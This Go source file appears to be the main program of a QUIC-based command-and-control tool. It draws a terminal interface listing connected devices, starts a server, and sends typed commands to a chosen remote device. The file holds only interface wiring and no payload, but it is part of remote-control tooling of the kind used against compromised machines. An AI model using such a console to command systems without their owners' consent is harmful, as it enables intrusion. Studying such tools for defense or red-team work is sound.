package main

import (
	"log"
	"quic-c2/models"
	server "quic-c2/quic"
	"quic-c2/tui"

	"strings"

	"github.com/gdamore/tcell/v2"
	"github.com/rivo/tview"
)

func main() {
	// Create input field for typing commands.
	input := tview.NewInputField().SetLabel("> ")

	// Draw initial layout and store global UI references.
	models.App, models.CommandView, models.DeviceList = tui.DrawPage(input)

	// Start the server in a background goroutine.
	go server.StartServer()

	// Handle "Enter" key when user submits a command.
	input.SetDoneFunc(func(key tcell.Key) {
		cmd := input.GetText()

		// Skip empty commands or if no device is selected.
		if strings.TrimSpace(cmd) == "" || models.SelectedDevice == "" {
			return
		}

		// Send command to selected device.
		if err := tui.SendCMD(models.SelectedDevice, cmd); err != nil {
			log.Println("SendCMD error:", err)
			return
		}

		// Scroll output and clear the input.
		models.CommandView.ScrollToEnd()
		input.SetText("")
	})

	// Build right-side panel (command output + input).
	rightPanel := tview.NewFlex().
		SetDirection(tview.FlexRow).
		AddItem(models.CommandView, 0, 1, false).
		AddItem(input, 1, 0, true)

	// Layout: devices on the left, command view on the right.
	layout := tview.NewFlex().
		AddItem(models.DeviceList, tui.GetTermWidth()/2, 1, true).
		AddItem(rightPanel, 0, 3, false)

	// Run the TUI.
	if err := models.App.SetRoot(layout, true).Run(); err != nil {
		log.Fatal(err)
	}
}
